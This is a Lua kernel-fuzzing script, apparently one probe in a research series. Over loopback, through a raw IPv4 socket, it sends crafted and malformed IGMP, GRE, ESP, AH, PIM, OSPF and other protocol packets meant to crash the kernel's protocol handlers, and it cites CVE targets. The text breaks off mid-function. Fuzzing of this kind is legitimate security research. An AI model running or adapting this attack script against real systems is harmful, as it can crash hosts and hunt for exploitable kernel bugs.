-- CRASH_CLASS: HIGH
-- PROBE 50a: Exotic Protocol Handler Fuzzing
--
-- Context: Probes 48a-49b confirmed TCP, SCTP, and IPv6 parsers are
-- well-hardened (584 attack variants, zero crashes). But probe 48a
-- discovered 143 raw IPv4 protocols all create sockets. Each protocol
-- has a kernel input handler that processes packets. The less-common
-- ones (IGMP, PIM, GRE, ESP, AH, VRRP, CARP, EGP) get far less
-- security auditing and may have simpler, buggier parsers.
--
-- Attack: Send crafted packets for each protocol to loopback via raw
-- IPv4 socket + IP_HDRINCL. These packets go through ip_input() and
-- dispatch to protocol-specific handlers:
--   - IGMP (proto 2)  — igmp_input(): membership queries/reports
--   - GRE  (proto 47) — gre_input(): tunnel decapsulation
--   - ESP  (proto 50) — ipsec4_common_input(): IPsec processing
--   - AH   (proto 51) — ipsec4_common_input(): auth header
--   - VRRP (proto 112) — raw delivery (no special handler, but kernel touches it)
--   - PIM  (proto 103) — pim_input(): multicast routing
--   - EGP  (proto 8)  — raw delivery
--   - OSPF (proto 89) — raw delivery
--   - L2TP (proto 115) — raw delivery
--   - SCTP (proto 132) — sctp_input() (already tested, light retest)
--
-- Key CVE targets:
--   - IGMP: CVE-2009-3547 (null ptr), various length/group parsing bugs
--   - GRE: tunnel decap confusion, recursive encapsulation
--   - ESP/AH: SPI lookup on bad SA, truncated headers
--   - PIM: multicast control messages with bad options
--
-- Loopback raw IP delivery confirmed working (probes 48b, 49a).
-- A crash/reboot = kernel protocol handler bug found.

print("=== PROBE 50a: EXOTIC PROTOCOL HANDLER FUZZ ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wb(addr, val)
    local ok = pcall(function() memory.write_byte(addr, val) end)
    return ok
end
local function safe_ww(addr, val)
    local ok = pcall(function() memory.write_word(addr, val) end)
    return ok
end

local pid = syscall.getpid():tonumber()
print("pid: " .. pid)

local sc_socket = make_syscall(97)
local sc_close = make_syscall(6)
local sc_setsockopt = make_syscall(105)
local sc_sendto = make_syscall(133)

local AF_INET = 2
local SOCK_RAW = 3

local sent = 0
local errors = 0

-- ============================================
-- SECTION A: Raw IPv4 socket with IP_HDRINCL
-- ============================================
print("--- SECTION A: Socket setup ---")

local raw_fd = nil
do
    local ret = sc_socket(uint64(AF_INET), uint64(SOCK_RAW), uint64(255))
    local fd = to_num(ret)
    if fd > 0 then
        raw_fd = fd
        print("  raw IPv4 socket: fd=" .. fd)
        local one = memory.alloc(4)
        safe_wd(one, 1)
        sc_setsockopt(uint64(raw_fd), uint64(0), uint64(2), uint64(one), uint64(4))
        print("  IP_HDRINCL set")
    else
        print("  raw IPv4 failed: " .. fd)
    end
end

if not raw_fd then
    print("=== PROBE 50a FAILED: no raw socket ===")
    return
end

-- sockaddr_in for 127.0.0.1
local dst_sa = memory.alloc(16)
safe_wb(dst_sa, 16)
safe_wb(dst_sa + 1, AF_INET)
safe_ww(dst_sa + 2, 0)
safe_wb(dst_sa + 4, 127); safe_wb(dst_sa + 5, 0)
safe_wb(dst_sa + 6, 0);   safe_wb(dst_sa + 7, 1)

-- Helper: build IPv4 header + payload and send
-- proto: IP protocol number
-- payload_fn: function(buf, offset) that writes payload bytes and returns length
local function send_raw_ip(proto, payload_fn, desc)
    local pkt = memory.alloc(2048)
    -- Zero first 256 bytes
    for i = 0, 63 do safe_wd(pkt + i * 4, 0) end

    -- Write payload first to get length
    local payload_len = payload_fn(pkt, 20)

    local total_len = 20 + payload_len

    -- IPv4 header
    safe_wb(pkt, 0x45)      -- version 4, IHL 5
    safe_wb(pkt + 1, 0)     -- TOS
    safe_wb(pkt + 2, math.floor(total_len / 256))
    safe_wb(pkt + 3, total_len % 256)
    safe_ww(pkt + 4, 0x5000 + (sent % 256))  -- identification
    safe_ww(pkt + 6, 0)     -- flags + frag offset
    safe_wb(pkt + 8, 64)    -- TTL
    safe_wb(pkt + 9, proto)  -- protocol
    safe_ww(pkt + 10, 0)    -- checksum (kernel fills on loopback)
    -- src = 127.0.0.1
    safe_wb(pkt + 12, 127); safe_wb(pkt + 13, 0)
    safe_wb(pkt + 14, 0);   safe_wb(pkt + 15, 1)
    -- dst = 127.0.0.1
    safe_wb(pkt + 16, 127); safe_wb(pkt + 17, 0)
    safe_wb(pkt + 18, 0);   safe_wb(pkt + 19, 1)

    local ok, ret = pcall(function()
        return sc_sendto(uint64(raw_fd), uint64(pkt), uint64(total_len),
            uint64(0), uint64(dst_sa), uint64(16))
    end)
    if ok then
        local rv = to_num(ret)
        if rv >= 0 then
            sent = sent + 1
            return true
        end
    end
    errors = errors + 1
    print("  [ERR] " .. desc)
    return false
end

print("")

-- ============================================
-- SECTION B: IGMP (proto 2) — igmp_input()
-- ============================================
-- IGMP header: type(1), max_resp(1), checksum(2), group_addr(4) = 8 bytes
-- Types: 0x11=Query, 0x12=V1 Report, 0x16=V2 Report, 0x22=V3 Report, 0x17=Leave
print("--- SECTION B: IGMP (proto 2) ---")

-- B1: IGMP Membership Query (type 0x11)
send_raw_ip(2, function(buf, off)
    safe_wb(buf + off, 0x11)     -- type: Membership Query
    safe_wb(buf + off + 1, 100)  -- max resp time (10 seconds)
    safe_ww(buf + off + 2, 0)    -- checksum
    safe_wd(buf + off + 4, 0)    -- group: 0.0.0.0 (general query)
    return 8
end, "B1 IGMP query general")
print("  B1: IGMP general query: sent")

-- B2: IGMP Query for specific group 224.0.0.1
send_raw_ip(2, function(buf, off)
    safe_wb(buf + off, 0x11)
    safe_wb(buf + off + 1, 10)
    safe_ww(buf + off + 2, 0)
    safe_wb(buf + off + 4, 224); safe_wb(buf + off + 5, 0)
    safe_wb(buf + off + 6, 0);   safe_wb(buf + off + 7, 1)
    return 8
end, "B2 IGMP query 224.0.0.1")
print("  B2: IGMP specific query 224.0.0.1: sent")

-- B3: IGMPv1 Membership Report (type 0x12)
send_raw_ip(2, function(buf, off)
    safe_wb(buf + off, 0x12)
    safe_wb(buf + off + 1, 0)
    safe_ww(buf + off + 2, 0)
    safe_wb(buf + off + 4, 239); safe_wb(buf + off + 5, 255)
    safe_wb(buf + off + 6, 255); safe_wb(buf + off + 7, 250)
    return 8
end, "B3 IGMPv1 report")
print("  B3: IGMPv1 membership report: sent")

-- B4: IGMPv2 Leave Group (type 0x17)
send_raw_ip(2, function(buf, off)
    safe_wb(buf + off, 0x17)
    safe_wb(buf + off + 1, 0)
    safe_ww(buf + off + 2, 0)
    safe_wb(buf + off + 4, 224); safe_wb(buf + off + 5, 0)
    safe_wb(buf + off + 6, 0);   safe_wb(buf + off + 7, 1)
    return 8
end, "B4 IGMPv2 leave")
print("  B4: IGMPv2 leave group: sent")

-- B5: IGMPv3 Membership Report (type 0x22) — more complex structure
-- IGMPv3 report: type(1), reserved(1), checksum(2), reserved(2), num_groups(2)
-- then group records: record_type(1), aux_len(1), num_sources(2), mcast_addr(4), sources...
send_raw_ip(2, function(buf, off)
    safe_wb(buf + off, 0x22)     -- type: V3 Report
    safe_wb(buf + off + 1, 0)
    safe_ww(buf + off + 2, 0)    -- checksum
    safe_ww(buf + off + 4, 0)    -- reserved
    safe_wb(buf + off + 6, 0)
    safe_wb(buf + off + 7, 1)    -- num_groups = 1
    -- Group record: MODE_IS_INCLUDE (1), aux_len=0, num_sources=0
    safe_wb(buf + off + 8, 1)    -- record type
    safe_wb(buf + off + 9, 0)    -- aux data len
    safe_ww(buf + off + 10, 0)   -- num sources
    safe_wb(buf + off + 12, 239); safe_wb(buf + off + 13, 1)
    safe_wb(buf + off + 14, 1);   safe_wb(buf + off + 15, 1)
    return 16
end, "B5 IGMPv3 report")
print("  B5: IGMPv3 membership report: sent")

-- B6: IGMP truncated (only 4 bytes — missing group)
send_raw_ip(2, function(buf, off)
    safe_wb(buf + off, 0x11)
    safe_wb(buf + off + 1, 0)
    safe_ww(buf + off + 2, 0)
    return 4
end, "B6 IGMP truncated")
print("  B6: IGMP truncated (4B, missing group): sent")

-- B7: IGMP zero-length
send_raw_ip(2, function(buf, off)
    return 0
end, "B7 IGMP zero")
print("  B7: IGMP zero-length: sent")

-- B8: IGMP unknown type (0xFF)
send_raw_ip(2, function(buf, off)
    safe_wb(buf + off, 0xFF)
    safe_wb(buf + off + 1, 0)
    safe_ww(buf + off + 2, 0)
    safe_wd(buf + off + 4, 0)
    return 8
end, "B8 IGMP unknown type 0xFF")
print("  B8: IGMP unknown type 0xFF: sent")

-- B9: IGMPv3 report with huge num_groups
send_raw_ip(2, function(buf, off)
    safe_wb(buf + off, 0x22)
    safe_wb(buf + off + 1, 0)
    safe_ww(buf + off + 2, 0)
    safe_ww(buf + off + 4, 0)
    safe_wb(buf + off + 6, 0xFF)
    safe_wb(buf + off + 7, 0xFF)  -- num_groups = 65535 (but no data follows)
    return 8
end, "B9 IGMPv3 65535 groups")
print("  B9: IGMPv3 report 65535 groups (truncated): sent")

-- B10: IGMPv3 with huge num_sources in group record
send_raw_ip(2, function(buf, off)
    safe_wb(buf + off, 0x22)
    safe_wb(buf + off + 1, 0)
    safe_ww(buf + off + 2, 0)
    safe_ww(buf + off + 4, 0)
    safe_wb(buf + off + 6, 0)
    safe_wb(buf + off + 7, 1)    -- 1 group record
    safe_wb(buf + off + 8, 1)    -- record type
    safe_wb(buf + off + 9, 0)    -- aux data len
    safe_wb(buf + off + 10, 0xFF)
    safe_wb(buf + off + 11, 0xFF) -- num_sources = 65535
    safe_wb(buf + off + 12, 239); safe_wb(buf + off + 13, 1)
    safe_wb(buf + off + 14, 1);   safe_wb(buf + off + 15, 1)
    return 16
end, "B10 IGMPv3 65535 sources")
print("  B10: IGMPv3 report 65535 sources (truncated): sent")

print("")

-- ============================================
-- SECTION C: GRE (proto 47) — gre_input()
-- ============================================
-- GRE header: flags(2), protocol_type(2) [+ optional checksum, key, sequence]
-- FreeBSD handles GRE decapsulation in the kernel
print("--- SECTION C: GRE (proto 47) ---")

-- C1: Basic GRE header (no optional fields), proto=IPv4 (0x0800)
send_raw_ip(47, function(buf, off)
    safe_ww(buf + off, 0)       -- flags: no checksum, no key, no seq
    safe_wb(buf + off + 2, 0x08)
    safe_wb(buf + off + 3, 0x00) -- protocol type: IPv4
    -- Payload: minimal "inner" IPv4 header
    safe_wb(buf + off + 4, 0x45)
    safe_wb(buf + off + 5, 0)
    safe_wb(buf + off + 6, 0)
    safe_wb(buf + off + 7, 20)   -- total length = 20 (header only)
    for i = 8, 19 do safe_wb(buf + off + i, 0) end
    safe_wb(buf + off + 12, 10)  -- inner src
    safe_wb(buf + off + 16, 10)  -- inner dst
    return 24
end, "C1 GRE basic IPv4")
print("  C1: GRE basic (encap IPv4): sent")

-- C2: GRE with checksum flag set
send_raw_ip(47, function(buf, off)
    safe_wb(buf + off, 0x80)     -- C flag set (checksum present)
    safe_wb(buf + off + 1, 0)
    safe_wb(buf + off + 2, 0x08)
    safe_wb(buf + off + 3, 0x00)
    -- Checksum (4 bytes: checksum + reserved)
    safe_ww(buf + off + 4, 0)    -- checksum = 0
    safe_ww(buf + off + 6, 0)    -- reserved
    -- Inner payload
    safe_wb(buf + off + 8, 0x45)
    safe_wb(buf + off + 9, 0)
    safe_wb(buf + off + 10, 0)
    safe_wb(buf + off + 11, 20)
    for i = 12, 27 do safe_wb(buf + off + i, 0) end
    return 28
end, "C2 GRE checksum")
print("  C2: GRE with checksum flag: sent")

-- C3: GRE with key flag set
send_raw_ip(47, function(buf, off)
    safe_wb(buf + off, 0x20)     -- K flag set (key present)
    safe_wb(buf + off + 1, 0)
    safe_wb(buf + off + 2, 0x08)
    safe_wb(buf + off + 3, 0x00)
    -- Key (4 bytes)
    safe_wd(buf + off + 4, 0xDEADBEEF)
    return 8
end, "C3 GRE key")
print("  C3: GRE with key: sent")

-- C4: GRE with sequence flag
send_raw_ip(47, function(buf, off)
    safe_wb(buf + off, 0x10)     -- S flag set
    safe_wb(buf + off + 1, 0)
    safe_wb(buf + off + 2, 0x08)
    safe_wb(buf + off + 3, 0x00)
    safe_wd(buf + off + 4, 1)   -- sequence number
    return 8
end, "C4 GRE sequence")
print("  C4: GRE with sequence: sent")

-- C5: GRE all flags set (C+K+S = 0xB0)
send_raw_ip(47, function(buf, off)
    safe_wb(buf + off, 0xB0)     -- C+K+S flags
    safe_wb(buf + off + 1, 0)
    safe_wb(buf + off + 2, 0x08)
    safe_wb(buf + off + 3, 0x00)
    safe_ww(buf + off + 4, 0)    -- checksum
    safe_ww(buf + off + 6, 0)    -- reserved
    safe_wd(buf + off + 8, 0x12345678)  -- key
    safe_wd(buf + off + 12, 42)  -- sequence
    return 16
end, "C5 GRE all flags")
print("  C5: GRE all flags (C+K+S): sent")

-- C6: GRE recursive encapsulation (GRE-in-GRE)
send_raw_ip(47, function(buf, off)
    safe_ww(buf + off, 0)
    safe_wb(buf + off + 2, 0x08)
    safe_wb(buf + off + 3, 0x00) -- outer: proto=IPv4
    -- Inner: another IP packet with GRE
    safe_wb(buf + off + 4, 0x45) -- inner IPv4
    safe_wb(buf + off + 5, 0)
    safe_wb(buf + off + 6, 0)
    safe_wb(buf + off + 7, 44)   -- total = 20 + 4 + 20
    for i = 8, 11 do safe_wb(buf + off + i, 0) end
    safe_wb(buf + off + 12, 64)  -- TTL
    safe_wb(buf + off + 13, 47)  -- proto = GRE (recursive!)
    safe_ww(buf + off + 14, 0)   -- checksum
    safe_wb(buf + off + 16, 127); safe_wb(buf + off + 17, 0)
    safe_wb(buf + off + 18, 0);   safe_wb(buf + off + 19, 1)
    safe_wb(buf + off + 20, 127); safe_wb(buf + off + 21, 0)
    safe_wb(buf + off + 22, 0);   safe_wb(buf + off + 23, 1)
    -- Inner GRE header
    safe_ww(buf + off + 24, 0)
    safe_wb(buf + off + 26, 0x08)
    safe_wb(buf + off + 27, 0x00)
    -- Inner-inner IPv4 stub
    safe_wb(buf + off + 28, 0x45)
    for i = 29, 47 do safe_wb(buf + off + i, 0) end
    safe_wb(buf + off + 31, 20)
    return 48
end, "C6 GRE recursive")
print("  C6: GRE recursive (GRE-in-GRE-in-IP): sent")

-- C7: GRE truncated (only 2 bytes — missing protocol type)
send_raw_ip(47, function(buf, off)
    safe_ww(buf + off, 0)
    return 2
end, "C7 GRE truncated")
print("  C7: GRE truncated (2B): sent")

-- C8: GRE zero-length
send_raw_ip(47, function(buf, off)
    return 0
end, "C8 GRE zero")
print("  C8: GRE zero-length: sent")

-- C9: GRE with invalid version (version field = 1, PPTP-style)
send_raw_ip(47, function(buf, off)
    safe_wb(buf + off, 0x20)     -- K flag
    safe_wb(buf + off + 1, 0x01) -- version = 1 (PPTP/enhanced GRE)
    safe_wb(buf + off + 2, 0x88)
    safe_wb(buf + off + 3, 0x0B) -- protocol = PPP (0x880B)
    safe_wd(buf + off + 4, 100)  -- key (call ID for PPTP)
    return 8
end, "C9 GRE version 1 PPTP")
print("  C9: GRE version 1 (PPTP): sent")

-- C10: GRE with protocol type = IPv6 (0x86DD)
send_raw_ip(47, function(buf, off)
    safe_ww(buf + off, 0)
    safe_wb(buf + off + 2, 0x86)
    safe_wb(buf + off + 3, 0xDD) -- protocol type: IPv6
    -- Minimal IPv6 header
    safe_wb(buf + off + 4, 0x60)
    for i = 5, 43 do safe_wb(buf + off + i, 0) end
    safe_wb(buf + off + 10, 59)  -- next header = No Next Header
    safe_wb(buf + off + 11, 64)  -- hop limit
    safe_wb(buf + off + 43, 1)   -- dst = ::1
    return 44
end, "C10 GRE IPv6 encap")
print("  C10: GRE with IPv6 payload: sent")

-- C11: GRE reserved flags set (bits that should be zero)
send_raw_ip(47, function(buf, off)
    safe_wb(buf + off, 0x4F)     -- reserved bits + version=7
    safe_wb(buf + off + 1, 0xFF)
    safe_wb(buf + off + 2, 0x08)
    safe_wb(buf + off + 3, 0x00)
    return 4
end, "C11 GRE reserved flags")
print("  C11: GRE reserved flags + bad version: sent")

print("")

-- ============================================
-- SECTION D: ESP (proto 50) — IPsec
-- ============================================
-- ESP header: SPI(4), Sequence(4), then encrypted payload
print("--- SECTION D: ESP (proto 50) ---")

-- D1: ESP with SPI=0 (invalid)
send_raw_ip(50, function(buf, off)
    safe_wd(buf + off, 0)       -- SPI = 0
    safe_wd(buf + off + 4, 1)   -- sequence = 1
    -- Fake encrypted payload
    for i = 0, 15 do safe_wb(buf + off + 8 + i, 0xAA) end
    return 24
end, "D1 ESP SPI=0")
print("  D1: ESP SPI=0: sent")

-- D2: ESP with SPI=1 (unlikely to match any SA)
send_raw_ip(50, function(buf, off)
    safe_wd(buf + off, 1)
    safe_wd(buf + off + 4, 1)
    for i = 0, 15 do safe_wb(buf + off + 8 + i, 0xBB) end
    return 24
end, "D2 ESP SPI=1")
print("  D2: ESP SPI=1: sent")

-- D3: ESP with max SPI (0xFFFFFFFF)
send_raw_ip(50, function(buf, off)
    safe_wd(buf + off, 0xFFFFFFFF)
    safe_wd(buf + off + 4, 0xFFFFFFFF)
    for i = 0, 15 do safe_wb(buf + off + 8 + i, 0xCC) end
    return 24
end, "D3 ESP max SPI")
print("  D3: ESP SPI=0xFFFFFFFF: sent")

-- D4: ESP truncated (only SPI, no sequence)
send_raw_ip(50, function(buf, off)
    safe_wd(buf + off, 0x12345678)
    return 4
end, "D4 ESP truncated")
print("  D4: ESP truncated (4B, no seq): sent")

-- D5: ESP zero-length
send_raw_ip(50, function(buf, off)
    return 0
end, "D5 ESP zero")
print("  D5: ESP zero-length: sent")

-- D6: ESP large payload (512 bytes of "encrypted" data)
send_raw_ip(50, function(buf, off)
    safe_wd(buf + off, 0x100)
    safe_wd(buf + off + 4, 1)
    for i = 0, 511 do safe_wb(buf + off + 8 + i, i % 256) end
    return 520
end, "D6 ESP large")
print("  D6: ESP with 512B payload: sent")

print("")

-- ============================================
-- SECTION E: AH (proto 51) — Authentication Header
-- ============================================
-- AH header: next_hdr(1), payload_len(1), reserved(2), SPI(4), seq(4), ICV(variable)
print("--- SECTION E: AH (proto 51) ---")

-- E1: AH with minimum header
send_raw_ip(51, function(buf, off)
    safe_wb(buf + off, 59)      -- next header = No Next Header
    safe_wb(buf + off + 1, 4)   -- payload len (4 = (4+2)*4 = 24 bytes total)
    safe_ww(buf + off + 2, 0)   -- reserved
    safe_wd(buf + off + 4, 256) -- SPI
    safe_wd(buf + off + 8, 1)   -- sequence
    -- ICV (integrity check value) — 12 bytes of garbage
    for i = 0, 11 do safe_wb(buf + off + 12 + i, 0xDD) end
    return 24
end, "E1 AH basic")
print("  E1: AH basic (SPI=256): sent")

-- E2: AH with SPI=0
send_raw_ip(51, function(buf, off)
    safe_wb(buf + off, 59)
    safe_wb(buf + off + 1, 4)
    safe_ww(buf + off + 2, 0)
    safe_wd(buf + off + 4, 0)
    safe_wd(buf + off + 8, 1)
    for i = 0, 11 do safe_wb(buf + off + 12 + i, 0) end
    return 24
end, "E2 AH SPI=0")
print("  E2: AH SPI=0: sent")

-- E3: AH truncated (only 8 bytes)
send_raw_ip(51, function(buf, off)
    safe_wb(buf + off, 59)
    safe_wb(buf + off + 1, 2)   -- payload len = 2 (claims 16 bytes total)
    safe_ww(buf + off + 2, 0)
    safe_wd(buf + off + 4, 1)
    return 8
end, "E3 AH truncated")
print("  E3: AH truncated (8B): sent")

-- E4: AH payload_len=0 (claims 8 bytes total but AH minimum is 12)
send_raw_ip(51, function(buf, off)
    safe_wb(buf + off, 59)
    safe_wb(buf + off + 1, 0)   -- payload len = 0 (too small)
    safe_ww(buf + off + 2, 0)
    safe_wd(buf + off + 4, 1)
    safe_wd(buf + off + 8, 1)
    return 12
end, "E4 AH payload_len=0")
print("  E4: AH payload_len=0 (undersize): sent")

-- E5: AH payload_len=255 (claims massive header)
send_raw_ip(51, function(buf, off)
    safe_wb(buf + off, 59)
    safe_wb(buf + off + 1, 255)
    safe_ww(buf + off + 2, 0)
    safe_wd(buf + off + 4, 1)
    safe_wd(buf + off + 8, 1)
    for i = 0, 11 do safe_wb(buf + off + 12 + i, 0xEE) end
    return 24
end, "E5 AH payload_len=255")
print("  E5: AH payload_len=255 (oversized claim): sent")

-- E6: AH zero-length
send_raw_ip(51, function(buf, off)
    return 0
end, "E6 AH zero")
print("  E6: AH zero-length: sent")

print("")

-- ============================================
-- SECTION F: PIM (proto 103) — pim_input()
-- ============================================
-- PIM header: version/type(1), reserved(1), checksum(2)
-- PIM types: 0=Hello, 1=Register, 2=Register-Stop, 3=Join/Prune,
--            4=Bootstrap, 5=Assert, 6=Graft, 7=Graft-Ack
print("--- SECTION F: PIM (proto 103) ---")

-- F1: PIM Hello (type 0)
send_raw_ip(103, function(buf, off)
    safe_wb(buf + off, 0x20)     -- version 2, type 0 (Hello)
    safe_wb(buf + off + 1, 0)    -- reserved
    safe_ww(buf + off + 2, 0)    -- checksum
    -- Hello option: Holdtime (type=1, length=2, value=105)
    safe_wb(buf + off + 4, 0)
    safe_wb(buf + off + 5, 1)    -- option type = Holdtime
    safe_wb(buf + off + 6, 0)
    safe_wb(buf + off + 7, 2)    -- option length = 2
    safe_wb(buf + off + 8, 0)
    safe_wb(buf + off + 9, 105)  -- holdtime = 105
    return 10
end, "F1 PIM Hello")
print("  F1: PIM Hello: sent")

-- F2: PIM Register (type 1)
send_raw_ip(103, function(buf, off)
    safe_wb(buf + off, 0x21)     -- version 2, type 1 (Register)
    safe_wb(buf + off + 1, 0)
    safe_ww(buf + off + 2, 0)
    safe_wd(buf + off + 4, 0)    -- B/N flags + reserved
    -- Enclosed multicast packet (minimal IPv4)
    safe_wb(buf + off + 8, 0x45)
    for i = 9, 27 do safe_wb(buf + off + i, 0) end
    safe_wb(buf + off + 11, 20)
    safe_wb(buf + off + 12, 64)  -- TTL
    safe_wb(buf + off + 20, 127); safe_wb(buf + off + 21, 0)
    safe_wb(buf + off + 22, 0);   safe_wb(buf + off + 23, 1)
    safe_wb(buf + off + 24, 239); safe_wb(buf + off + 25, 1)
    safe_wb(buf + off + 26, 1);   safe_wb(buf + off + 27, 1)
    return 28
end, "F2 PIM Register")
print("  F2: PIM Register: sent")

-- F3: PIM Assert (type 5)
send_raw_ip(103, function(buf, off)
    safe_wb(buf + off, 0x25)     -- version 2, type 5
    safe_wb(buf + off + 1, 0)
    safe_ww(buf + off + 2, 0)
    -- Group address (encoded unicast: AF=1, encoding=0, addr)
    safe_wb(buf + off + 4, 1)    -- addr family
    safe_wb(buf + off + 5, 0)    -- encoding type
    safe_wb(buf + off + 6, 0)    -- reserved
    safe_wb(buf + off + 7, 32)   -- mask len
    safe_wb(buf + off + 8, 239); safe_wb(buf + off + 9, 1)
    safe_wb(buf + off + 10, 1);  safe_wb(buf + off + 11, 1)
    -- Source address
    safe_wb(buf + off + 12, 1); safe_wb(buf + off + 13, 0)
    safe_wb(buf + off + 14, 0); safe_wb(buf + off + 15, 32)
    safe_wb(buf + off + 16, 10); safe_wb(buf + off + 17, 0)
    safe_wb(buf + off + 18, 0);  safe_wb(buf + off + 19, 1)
    -- Metric preference + metric
    safe_wd(buf + off + 20, 0)
    safe_wd(buf + off + 24, 1)
    return 28
end, "F3 PIM Assert")
print("  F3: PIM Assert: sent")

-- F4: PIM unknown type (15)
send_raw_ip(103, function(buf, off)
    safe_wb(buf + off, 0x2F)     -- version 2, type 15
    safe_wb(buf + off + 1, 0)
    safe_ww(buf + off + 2, 0)
    return 4
end, "F4 PIM unknown type")
print("  F4: PIM unknown type 15: sent")

-- F5: PIM version 0 (invalid)
send_raw_ip(103, function(buf, off)
    safe_wb(buf + off, 0x00)     -- version 0, type 0
    safe_wb(buf + off + 1, 0)
    safe_ww(buf + off + 2, 0)
    return 4
end, "F5 PIM version 0")
print("  F5: PIM version 0: sent")

-- F6: PIM truncated (1 byte)
send_raw_ip(103, function(buf, off)
    safe_wb(buf + off, 0x20)
    return 1
end, "F6 PIM truncated")
print("  F6: PIM truncated (1B): sent")

-- F7: PIM zero-length
send_raw_ip(103, function(buf, off)
    return 0
end, "F7 PIM zero")
print("  F7: PIM zero-length: sent")

print("")

-- ============================================
-- SECTION G: OSPF (proto 89)
-- ============================================
-- OSPF header: version(1), type(1), length(2), router_id(4),
--              area_id(4), checksum(2), autype(2), auth(8) = 24 bytes
print("--- SECTION G: OSPF (proto 89) ---")

-- G1: OSPF Hello (type 1)
send_raw_ip(89, function(buf, off)
    safe_wb(buf + off, 2)        -- version 2
    safe_wb(buf + off + 1, 1)    -- type: Hello
    safe_wb(buf + off + 2, 0)
    safe_wb(buf + off + 3, 48)   -- length = 48
    safe_wd(buf + off + 4, 0x01010101)  -- router ID
    safe_wd(buf + off + 8, 0)    -- area ID
    safe_ww(buf + off + 12, 0)   -- checksum
    safe_ww(buf + off + 14, 0)   -- auth type = null
    for i = 16, 23 do safe_wb(buf + off + i, 0) end -- auth data
    -- Hello-specific fields
    safe_wd(buf + off + 24, 0xFFFFFF00) -- network mask
    safe_ww(buf + off + 28, 10)  -- hello interval
    safe_wb(buf + off + 30, 0)   -- options
    safe_wb(buf + off + 31, 1)   -- router priority
    safe_wd(buf + off + 32, 40)  -- dead interval
    safe_wd(buf + off + 36, 0)   -- designated router
    safe_wd(buf + off + 40, 0)   -- backup DR
    safe_wd(buf + off + 44, 0x02020202) -- neighbor
    return 48
end, "G1 OSPF Hello")
print("  G1: OSPF Hello: sent")

-- G2: OSPF zero-length
send_raw_ip(89, function(buf, off)
    return 0
end, "G2 OSPF zero")
print("  G2: OSPF zero-length: sent")

-- G3: OSPF truncated (8 bytes)
send_raw_ip(89, function(buf, off)
    safe_wb(buf + off, 2)
    safe_wb(buf + off + 1, 1)
    safe_wb(buf + off + 2, 0)
    safe_wb(buf + off + 3, 24)
    safe_wd(buf + off + 4, 0x01010101)
    return 8
end, "G3 OSPF truncated")
print("  G3: OSPF truncated (8B): sent")

print("")

-- ============================================
-- SECTION H: Misc protocol handlers
-- ============================================
print("--- SECTION H: Misc protocols ---")

-- H1: EGP (proto 8) — ancient protocol
send_raw_ip(8, function(buf, off)
    safe_wb(buf + off, 2)        -- version
    safe_wb(buf + off + 1, 5)    -- type: Error
    safe_wb(buf + off + 2, 0)    -- code
    safe_wb(buf + off + 3, 0)    -- status
    safe_ww(buf + off + 4, 0)    -- checksum
    safe_ww(buf + off + 6, 0xCAFE) -- autonomous system
    safe_ww(buf + off + 8, 1)    -- sequence
    return 10
end, "H1 EGP")
print("  H1: EGP error message: sent")

-- H2: L2TP (proto 115)
send_raw_ip(115, function(buf, off)
    -- L2TPv3 header: session ID (4 bytes)
    safe_wd(buf + off, 0x12345678)
    -- Cookie (optional, 8 bytes)
    safe_wd(buf + off + 4, 0xDEADBEEF)
    safe_wd(buf + off + 8, 0xCAFEBABE)
    return 12
end, "H2 L2TP")
print("  H2: L2TPv3: sent")

-- H3: IPIP/IP-in-IP (proto 4) — tunnel decap
send_raw_ip(4, function(buf, off)
    -- Inner IPv4 packet
    safe_wb(buf + off, 0x45)
    safe_wb(buf + off + 1, 0)
    safe_wb(buf + off + 2, 0)
    safe_wb(buf + off + 3, 40)   -- total = 20 + 20 (inner + inner TCP)
    for i = 4, 7 do safe_wb(buf + off + i, 0) end
    safe_wb(buf + off + 8, 64)   -- TTL
    safe_wb(buf + off + 9, 6)    -- proto = TCP
    safe_ww(buf + off + 10, 0)
    safe_wb(buf + off + 12, 127); safe_wb(buf + off + 13, 0)
    safe_wb(buf + off + 14, 0);   safe_wb(buf + off + 15, 1)
    safe_wb(buf + off + 16, 127); safe_wb(buf + off + 17, 0)
    safe_wb(buf + off + 18, 0);   safe_wb(buf + off + 19, 1)
    -- Minimal TCP header (20 bytes)
    for i = 20, 39 do safe_wb(buf + off + i, 0) end
    safe_wb(buf + off + 32, 0x50) -- data offset = 5 words
    return 40
end, "H3 IP-in-IP")
print("  H3: IP-in-IP tunnel: sent")

-- H4: IPv6-in-IPv4 (proto 41) with malformed inner IPv6
send_raw_ip(41, function(buf, off)
    safe_wb(buf + off, 0x60)     -- version 6
    safe_wb(buf + off + 1, 0)
    safe_ww(buf + off + 2, 0)
    safe_ww(buf + off + 4, 0)    -- payload length = 0
    safe_wb(buf + off + 6, 59)   -- next header = No Next Header
    safe_wb(buf + off + 7, 0)    -- hop limit = 0 (expired!)
    for i = 8, 39 do safe_wb(buf + off + i, 0) end
    safe_wb(buf + off + 23, 1)   -- src = ::1
    safe_wb(buf + off + 39, 1)   -- dst = ::1
    return 40
end, "H4 IPv6-in-IPv4 expired")
print("  H4: IPv6-in-IPv4 (hop limit=0): sent")

-- H5: Protocol 253 (experimental/testing per RFC 3692)
send_raw_ip(253, function(buf, off)
    for i = 0, 31 do safe_wb(buf + off + i, 0xFF) end
    return 32
end, "H5 proto 253 experimental")
print("  H5: Protocol 253 (experimental): sent")

-- H6: Protocol 0 (HOPOPT — should not appear as IP proto)
send_raw_ip(0, function(buf, off)
    for i = 0, 7 do safe_wb(buf + off + i, 0) end
    return 8
end, "H6 proto 0 HOPOPT")
print("  H6: Protocol 0 (HOPOPT): sent")

-- H7: VRRP (proto 112)
send_raw_ip(112, function(buf, off)
    -- VRRP header: version/type(1), vrid(1), priority(1), count(1),
    --              auth_type(1), adver_int(1), checksum(2)
    safe_wb(buf + off, 0x21)     -- version 2, type 1 (Advertisement)
    safe_wb(buf + off + 1, 1)    -- VRID = 1
    safe_wb(buf + off + 2, 100)  -- priority
    safe_wb(buf + off + 3, 1)    -- IP count = 1
    safe_wb(buf + off + 4, 0)    -- auth type = none
